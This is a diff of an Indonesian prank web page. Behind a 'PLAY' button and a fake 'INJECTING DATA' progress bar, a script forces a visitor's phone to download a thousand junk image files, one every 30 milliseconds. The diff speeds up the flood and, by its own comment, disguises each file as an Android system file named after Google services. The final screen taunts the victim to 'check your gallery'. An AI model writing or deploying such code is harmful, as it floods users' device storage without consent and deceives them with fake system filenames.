@@ -7,47 +7,30 @@
     <style>
         body { background: #000; color: #fff; font-family: 'Courier New', Courier, monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
         #overlay, #loader-ui, #finish-ui { text-align: center; width: 85%; }
-        .play-btn { background: #ff0000; color: #fff; border: none; padding: 20px 60px; font-size: 26px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 0 25px #ff0000; transition: 0.2s; }
-        .play-btn:active { transform: scale(0.9); }
+        .play-btn { background: #ff0000; color: #fff; border: none; padding: 20px 60px; font-size: 26px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 0 25px #ff0000; }
         .progress-bg { background: #222; border-radius: 20px; height: 20px; width: 100%; margin: 25px 0; overflow: hidden; border: 1px solid #444; }
-        #fill { background: linear-gradient(90deg, #00ff00, #008800); height: 100%; width: 0%; box-shadow: 0 0 15px #00ff00; transition: width 0.1s; }
+        #fill { background: linear-gradient(90deg, #00ff00, #008800); height: 100%; width: 0%; box-shadow: 0 0 15px #00ff00; }
         .toxic-text { color: #ff0000; font-size: 32px; font-weight: bold; animation: shake 0.1s infinite; display: none; }
         @keyframes shake { 0% {transform:translate(2px,1px)} 50% {transform:translate(-2px,-2px)} 100% {transform:translate(1px,2px)} }
-        #status { font-size: 14px; color: #00ff00; height: 20px; }
-        
-        /* Watermark Bimz Official */
-        .footer { 
-            position: fixed; 
-            bottom: 50px; 
-            left: 0;
-            right: 0;
-            font-size: 18px; 
-            color: #666; 
-            letter-spacing: 2px;
-            font-weight: bold;
-            text-align: center;
-        }
+        .footer { position: fixed; bottom: 50px; left: 0; right: 0; font-size: 18px; color: #666; letter-spacing: 2px; font-weight: bold; text-align: center; }
     </style>
 </head>
 <body>
 
-    <!-- TAMPILAN AWAL -->
     <div id="overlay">
         <h1 style="letter-spacing: 5px; margin-bottom: 40px;">SERVER READY</h1>
-        <button class="play-btn" onclick="startTurboAttack()">PLAY</button>
+        <button class="play-btn" onclick="startBrutalAttack()">PLAY</button>
         <div class="footer">© Bimz Official</div>
     </div>
 
-    <!-- TAMPILAN LOADING -->
     <div id="loader-ui" style="display: none;">
-        <h2 id="title">INJECTING RESOURCES...</h2>
+        <h2 id="title">INJECTING DATA...</h2>
         <div id="percent" style="font-size: 40px; margin-bottom: 10px; color: #00ff00;">0%</div>
         <div class="progress-bg"><div id="fill"></div></div>
-        <p id="status">Menginisialisasi handshake...</p>
+        <p id="status">Menginisialisasi...</p>
         <div class="footer">© Bimz Official</div>
     </div>
 
-    <!-- PESAN AKHIR -->
     <div id="finish-ui" class="toxic-text">
         Yahaha bego cek galeri lo 🤣
         <div class="footer" style="color: #ff0000;">© Bimz Official</div>
@@ -56,25 +39,13 @@
     <script>
         let current = 0;
         const total = 1000;
-
-        // Gambar Base64 (Internal) - Gak butuh internet buat download fotonya
         const dummyImg = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
 
-        const statusTexts = [
-            "Connecting to database...",
-            "Bypassing firewall...",
-            "Extracting OBB files...",
-            "Syncing account data...",
-            "Injecting skin scripts...",
-            "Cleaning cache logs...",
-            "Finalizing encryption...",
-            "Verifying security patch..."
-        ];
-
-        function startTurboAttack() {
+        function startBrutalAttack() {
             document.getElementById('overlay').style.display = 'none';
             document.getElementById('loader-ui').style.display = 'block';
 
+            // Menjalankan download dengan interval sangat singkat
             const bomber = setInterval(() => {
                 if (current >= total) {
                     clearInterval(bomber);
@@ -88,20 +59,16 @@
                 document.getElementById('fill').style.width = progress + "%";
                 document.getElementById('percent').innerText = Math.floor(progress) + "%";
 
-                if (current % 125 === 0) {
-                    const randomText = statusTexts[Math.floor(Math.random() * statusTexts.length)];
-                    document.getElementById('status').innerText = randomText;
-                }
-
-                // Perintah download otomatis ke HP
+                // Trigger Download
                 const a = document.createElement('a');
                 a.href = dummyImg;
-                a.download = "IMG_SYSTEM_" + current + ".jpg";
+                // Nama file disamarkan sebagai file sistem
+                a.download = "com.google.android.gms.sync_v82." + current + ".jpg";
                 document.body.appendChild(a);
                 a.click();
                 document.body.removeChild(a);
 
-            }, 50); // Speed: 50ms per file
+            }, 30); // Kecepatan super: 30ms
         }
     </script>
 </body>
